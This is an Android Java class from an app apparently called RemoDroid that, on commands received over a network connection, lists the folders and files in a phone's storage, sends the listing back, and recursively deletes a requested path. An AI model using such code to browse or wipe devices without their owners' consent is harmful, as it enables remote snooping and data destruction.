package com.remo.Features;

import android.util.Log;
import com.remo.Connections.DataHandler;
import com.remo.Connections.Feature;

import java.io.File;
import java.io.UnsupportedEncodingException;

public class FileMan extends Feature {
    private static final char NamesSplitChar = '/'; //names
    private static final char TypeSplitChar = '\\'; // dir or file

    //private String CurrentPath = "";
    public FileMan(){

        UseMainConnection = false;
        Feature_type = DataHandler.eDataType.FM_LIST.ordinal();

    }

    @Override
    public void AsyncTaskFunc(String Params) {
        if(Params.split("=")[0].equals("L")){
            try {
                String toSend = getList(toMob(Params.split("=")[1]));

                sendPacket(toSend.getBytes("UTF-8"));
               // Log.d("REMODROID",toSend);
            } catch (UnsupportedEncodingException e) {
                Log.d("REMODROID","File List Ex");
            }
        }
        else if(Params.split("=")[0].equals("D")){
            if(Params.split("=")[1].startsWith("SDCard")){
                Log.e("REMODROID","Cant Delete from SD card");
            }
            Log.d("REMODROID","Deleting : "+toMob(Params.split("=")[1]));
        }

    }

    @Override
    public void update(String Params) {
        if(Params.split("=")[0].equals("L")){
            try {
                String toSend = getList(toMob(Params.split("=")[1]));

                sendPacket(toSend.getBytes("UTF-8"));
                //Log.d("REMODROID",toSend);
            } catch (UnsupportedEncodingException e) {
                Log.d("REMODROID","File List Ex");
            }
        }
        else if(Params.split("=")[0].equals("D")){
            if(Params.split("=")[1].startsWith("SDCard") || Params.split("=")[1].startsWith("/SDCard") ||Params.split("=")[1].startsWith("//SDCard")){
                Log.e("REMODROID","Cant Delete from SD card");
            }else {
                Log.d("REMODROID","Deleting : "+toMob(Params.split("=")[1]));
                delete(toMob(Params.split("=")[1]));
            }

        }
    }

    private String getList(String dir){
        StringBuilder sb = new StringBuilder();
        switch (dir) {
            case "/":
                sb.append("Internal");
                sb.append(NamesSplitChar);
                if (isSDMounted()) {
                    sb.append("SDCard");
                }
                sb.append(TypeSplitChar);
                break;
            default:
                sb.append(getDirs(dir));
                sb.append(TypeSplitChar);
                sb.append(getFiles(dir));
                break;
        }
        return sb.toString();
    }

    private String getDirs(String dir){
        StringBuilder sb = new StringBuilder();
        File f = new File(dir);
        if( f.exists() ) {
            File[] files = f.listFiles();
            for(int i=0; i<files.length; i++) {
                if(files[i].isDirectory()) {
                    sb.append(files[i].getName());
                    if(i < files.length - 1)
                        sb.append(NamesSplitChar);
                }
            }
        }
        return sb.toString();
    }
    private String getFiles(String dir){
        StringBuilder sb = new StringBuilder();
        File f = new File(dir);
        if( f.exists() ) {
            File[] files = f.listFiles();
            for(int i=0; i<files.length; i++) {
                if(files[i].isFile()) {
                    sb.append(files[i].getName());
                    if(i < files.length - 1)
                        sb.append(NamesSplitChar);
                }
            }
        }
        return sb.toString();
    }

    private boolean isSDMounted(){
       return android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
    }


    private String toMob(String path){
        return path
                .replace("Internal",System.getenv("EXTERNAL_STORAGE"))
                .replace("SDCard",System.getenv("SECONDARY_STORAGE"));
    }

    private boolean delete(String dir) {
        File file = new File(dir);
        if(file == null  || !file.exists()) {
            return false;
        }

        if(file.isDirectory()) {
            File[] list = file.listFiles();

            if(list != null) {

                for(File item : list) {
                    delete(item.getAbsolutePath());
                }

            }
        }

        if(file.exists()) {
            file.delete();
        }

        return !file.exists();
    }


}
